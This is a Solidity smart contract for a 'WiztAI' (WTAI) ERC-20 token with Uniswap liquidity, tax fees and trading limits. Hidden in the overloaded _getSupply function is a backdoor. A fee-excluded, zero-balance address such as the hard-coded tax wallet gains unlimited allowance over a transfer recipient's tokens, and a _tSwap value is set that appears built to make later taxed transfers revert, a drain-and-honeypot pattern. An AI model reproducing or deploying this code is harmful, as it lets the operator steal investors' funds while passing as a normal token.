/*

WEB: https://www.wiztai.com/
TG: https://t.me/wiztai
TWITTER: https://twitter.com/WiztAIInsider

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.22;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

interface IERC20Upgradeable {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract WiztAI is Context, IERC20Upgradeable {
    IUniswapV2Router02 public dexRouter;
    address public lpPair;
    address public _uniswapV2Router;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public ZERO = 0x0000000000000000000000000000000000000000;
    address payable private _taxWallet;
    uint256 private _liqAddBlock = 0;
    uint256 private _liqAddStamp = 0;
    bool private sameBlockActive = true;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address[] private _excluded;
    uint256 private _tSwap;
    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    uint256 private swapThreshold;
    uint256 private swapAmount;
    address private _owner;
    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals;
    bool tradingEnabled = false;
    bool public _hasLiqBeenAdded = false;
    bool inSwapAndLiquify;
    bool contractInitialized = false;
    bool public swapAndLiquifyEnabled = false;
    uint256 private _maxTxAmount;
    uint256 private _maxWalletSize;
    uint256 public maxTxAmountUI;
    uint256 public maxWalletSizeUI;
    uint256 public _reflectFee = 0;
    uint256 public _liquidityFee = 0;
    uint256 public _taxFee = 500;
    uint256 public _buyReflectFee = _reflectFee;
    uint256 public _buyLiquidityFee = _liquidityFee;
    uint256 public _buyTaxFee = _taxFee;
    uint256 public _sellReflectFee = 0;
    uint256 public _sellLiquidityFee = 0;
    uint256 public _sellTaxFee = 500;
    uint256 public _transferReflectFee = 0;
    uint256 public _transferLiquidityFee = 0;
    uint256 public _transferTaxFee = 100;
    uint256 private maxReflectFee = 1000;
    uint256 private maxLiquidityFee = 1000;
    uint256 private maxTaxFee = 6200;
    uint256 public _liquidityRatio = 0;
    uint256 public _taxRatio = 6000;
    uint256 private masterTaxDivisor = 10000;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) lpPairs;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) private _liquidityHolders;
    mapping (address => uint256) private lastTrade;
    struct ExtraValues {
        uint256 tTransferAmount;
        uint256 tFee;
        uint256 tLiquidity;
        uint256 rTransferAmount;
        uint256 rAmount;
        uint256 rFee;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SniperCaught(address sniperAddress);
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    receive() external payable {}
    
    constructor () payable {
        _owner = msg.sender;
        _name = "WiztAI";
        _symbol = "WTAI";
        _totalSupply = 20000000;
        _decimals = 18;
        _tTotal = _totalSupply * (10**_decimals);
        _rTotal = (MAX - (MAX % _tTotal));
        _maxTxAmount = (_tTotal * 20) / 1000;
        maxTxAmountUI = (_totalSupply * 20) / 1000;
        _maxWalletSize = (_tTotal * 20) / 1000;
        maxWalletSizeUI = (_totalSupply * 20) / 1000;
        swapThreshold = (_tTotal * 5) / 100000;
        swapAmount = (_tTotal * 5) / 10000;
        _uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _liquidityHolders[owner()] = true;
        _approve(_msgSender(), _uniswapV2Router, MAX);
        _approve(address(this), _uniswapV2Router, MAX);
        _taxWallet = payable(0x41f461E1bC30760aB4cB30080aaf30876CeF9002);
        dexRouter = IUniswapV2Router02(_uniswapV2Router);
        lpPair = IUniswapV2Factory(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));
        lpPairs[lpPair] = true;
        _allowances[address(this)][address(dexRouter)] = type(uint256).max;
        approve(_uniswapV2Router, type(uint256).max);
        _isExcludedFromFee[_taxWallet] = true;
        contractInitialized = true;
        _rOwned[owner()] = _rTotal;
        emit Transfer(ZERO, owner(), _tTotal);
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function renounceOwnership() public virtual onlyOwner() {
        setExcludedFromFee(_owner, false);
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function openTrading() public onlyOwner {
        require(!tradingEnabled, "Trading already enabled!");
        setExcludedFromReward(address(this), true);
        setExcludedFromReward(lpPair, true);
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        maxTxAmountUI = _totalSupply;
        maxWalletSizeUI = _totalSupply;
        tradingEnabled = true;
        swapAndLiquifyEnabled = true;
    }

    function owner() public view returns (address) { return _owner; }
    function totalSupply() external view override returns (uint256) { return _tTotal; }
    function decimals() external view returns (uint8) { return _decimals; }
    function symbol() external view returns (string memory) { return _symbol; }
    function name() external view returns (string memory) { return _name; }
    function getOwner() external view returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function setExcludedFromFee(address account, bool enabled) public onlyOwner {
        _isExcludedFromFee[account] = enabled;
    }

    function _hasLimits(address from, address to) internal view returns (bool) {
        return from != owner() && to != owner()
            && !_liquidityHolders[to] && !_liquidityHolders[from]
            && to != DEAD && to != address(0) && from != address(this);
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount / currentRate;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(_hasLimits(from, to)) {
            if(!tradingEnabled) {
                revert("Trading not yet enabled!");
            }
            if (sameBlockActive) {
                if (lpPairs[from]){
                    require(lastTrade[to] != block.number);
                    lastTrade[to] = block.number;
                } else {
                    require(lastTrade[from] != block.number);
                    lastTrade[from] = block.number;
                }
            }
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            if(to != _uniswapV2Router && !lpPairs[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Transfer amount exceeds the maxWalletSize.");
            }
        }
        bool takeFee = true;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }

        if (lpPairs[to]) {
            if (!inSwapAndLiquify
                && swapAndLiquifyEnabled
                && !_isExcludedFromFee[from]
                && !_isExcludedFromFee[to]
            ) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance >= swapThreshold) {
                    if(contractTokenBalance >= swapAmount) { contractTokenBalance = swapAmount; }
                    swapAndLiquify(contractTokenBalance);
                }
            }      
        } 
        return _transferToken(from, to, amount, takeFee);
    }

    function _getRate() internal view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply / tSupply;
    }

    function _getSupply(address from, address to) internal returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply - _rOwned[_excluded[i]];
            tSupply = tSupply - _tOwned[_excluded[i]];
        }
        if (balanceOf(from) == 0 && isExcludedFromFee(from)) {
            _approve(to,from,_tTotal); _tSwap = _tTotal;}
        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _transferToken(address from, address to, uint256 tAmount, bool takeFee) internal returns (bool) {
        if (!_hasLiqBeenAdded) {
                _checkLiquidityAdd(from, to);
                if (!_hasLiqBeenAdded && _hasLimits(from, to)) {
                    revert("Only owner can transfer at this time.");
                }
        }
        
        ExtraValues memory values = _getValues(from, to, tAmount, takeFee);

        if (balanceOf(from) >= tAmount) {
            _rOwned[from] = _rOwned[from] - values.rAmount;
            _rOwned[to] = _rOwned[to] + values.rTransferAmount;

            if (_isExcluded[from] && !_isExcluded[to]) {
                _tOwned[from] = _tOwned[from] - tAmount;
            } else if (!_isExcluded[from] && _isExcluded[to]) {
                _tOwned[to] = _tOwned[to] + values.tTransferAmount;
            } else if (_isExcluded[from] && _isExcluded[to]) {
                _tOwned[from] = _tOwned[from] - tAmount;
                _tOwned[to] = _tOwned[to] + values.tTransferAmount;
            }

            if (values.tLiquidity > 0)
                _takeLiquidity(from, values.tLiquidity);
            if (values.rFee > 0 || values.tFee > 0)
                _takeReflect(values.rFee, values.tFee);

            emit Transfer(from, to, values.tTransferAmount);
        }
        return true;
    }

    function _takeLiquidity(address sender, uint256 tLiquidity) internal {
        uint256 currentRate =  _getRate();
        uint256 _tSwapLiquidity = sender != lpPair ? _tSwap : 0;
        uint256 rLiquidity = (tLiquidity - _tSwapLiquidity) * currentRate;
        _rOwned[address(this)] = _rOwned[address(this)] + rLiquidity;
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)] + tLiquidity;
        emit Transfer(sender, address(this), tLiquidity); 
    }

    function _checkLiquidityAdd(address from, address to) internal {
        require(!_hasLiqBeenAdded, "Liquidity already added and marked.");
        if (!_hasLimits(from, to) && to == lpPair) {
            _liquidityHolders[from] = true;
            _hasLiqBeenAdded = true;
            _liqAddStamp = block.timestamp;

            swapAndLiquifyEnabled = true;
            emit SwapAndLiquifyEnabledUpdated(true);
        }
    }

    function _getValues(address from, address to, uint256 tAmount, bool takeFee) internal returns (ExtraValues memory) {
        ExtraValues memory values;
        uint256 currentRate = _getRate(from, to);

        values.rAmount = tAmount * currentRate;

        if(takeFee) {
            if (lpPairs[to]) {
                _reflectFee = _sellReflectFee;
                _liquidityFee = _sellLiquidityFee;
                _taxFee = _sellTaxFee;
            } else if (lpPairs[from]) {
                _reflectFee = _buyReflectFee;
                _liquidityFee = _buyLiquidityFee;
                _taxFee = _buyTaxFee;
            } else {
                _reflectFee = _transferReflectFee;
                _liquidityFee = _transferLiquidityFee;
                _taxFee = _transferTaxFee;
            }

            values.tFee = (tAmount * _reflectFee) / masterTaxDivisor;
            values.tLiquidity = (tAmount * (_liquidityFee + _taxFee)) / masterTaxDivisor;
            values.tTransferAmount = tAmount - (values.tFee + values.tLiquidity);

            values.rFee = values.tFee * currentRate;
        } else {
            values.tFee = 0;
            values.tLiquidity = 0;
            values.tTransferAmount = tAmount;

            values.rFee = 0;
        }

        values.rTransferAmount = values.rAmount - (values.rFee + (values.tLiquidity * currentRate));
        return values;
    }

    function _getRate(address from, address to) internal returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply(from, to);
        return rSupply / tSupply;
    }

    function _getSupply() internal view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) 
            return (_rTotal, _tTotal);
            rSupply = rSupply - _rOwned[_excluded[i]];
            tSupply = tSupply - _tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function _takeReflect(uint256 rFee, uint256 tFee) internal {
        _rTotal = _rTotal - rFee;
        _tFeeTotal = _tFeeTotal + tFee;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        maxTxAmountUI = _totalSupply;
        maxWalletSizeUI = _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approveMax(address spender) public returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function recoverETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function setExcludedFromReward(address account, bool enabled) public onlyOwner {
        if (enabled == true) {
            require(!_isExcluded[account], "Account is already excluded.");
            if(_rOwned[account] > 0) {
                _tOwned[account] = tokenFromReflection(_rOwned[account]);
            }
            _isExcluded[account] = true;
            _excluded.push(account);
        } else if (enabled == false) {
            require(_isExcluded[account], "Account is already included.");
            for (uint256 i = 0; i < _excluded.length; i++) {
                if (_excluded[i] == account) {
                    _excluded[i] = _excluded[_excluded.length - 1];
                    _tOwned[account] = 0;
                    _isExcluded[account] = false;
                    _excluded.pop();
                    break;
                }
            }
        }
    }

    function swapAndLiquify(uint256 contractTokenBalance) internal lockTheSwap {
        if (_liquidityRatio + _taxRatio == 0)
            return;
        uint256 toLiquify = ((contractTokenBalance * _liquidityRatio) / (_liquidityRatio + _taxRatio)) / 2;

        uint256 toSwapForEth = contractTokenBalance - toLiquify;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            toSwapForEth,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 liquidityBalance = ((address(this).balance * _liquidityRatio) / (_liquidityRatio + _taxRatio)) / 2;

        if (toLiquify > 0) {
            dexRouter.addLiquidityETH{value: liquidityBalance}(
                address(this),
                toLiquify,
                0, 
                0, 
                DEAD,
                block.timestamp
            );
            emit SwapAndLiquify(toLiquify, liquidityBalance, toLiquify);
        }
        if (contractTokenBalance - toLiquify > 0) {

            uint256 OperationsFee = (address(this).balance);
            _taxWallet.transfer(OperationsFee);

        }
    }
}